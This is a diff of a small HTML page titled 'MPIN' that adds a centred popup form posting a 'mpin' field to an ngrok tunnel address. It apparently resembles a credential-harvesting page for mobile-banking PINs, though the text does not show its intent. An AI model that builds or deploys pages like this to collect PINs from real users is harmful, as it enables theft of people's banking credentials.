@@ -2,11 +2,29 @@
 <html>
 <head>
 	<title>MPIN</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+	<style type="text/css">
+		#outPopUp {
+		  position: absolute;
+		  width: 300px;
+		  height: 200px;
+		  z-index: 15;
+		  top: 50%;
+		  left: 50%;
+		  margin: -100px 0 0 -150px;
+		}
+	</style>
+	<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
 </head>
 <body>
-<form>
-	<label>Enter Mpin</label>
-	<input type="text" name="mpin">
-</form>
+	<div id="outPopUp">
+		<form action="https://9a2a2130.ngrok.io/mpin_submission" method="POST" id="mpin-form">
+			<input type="text" class="form-control" placeholder="M-Pin" name="mpin" id="mpin"><br>
+			<button type="submit" class="btn btn-primary btn-block btn-large">Submit M-Pin</button>
+		</form>
+	</div>
+	
+	
 </body>
 </html>
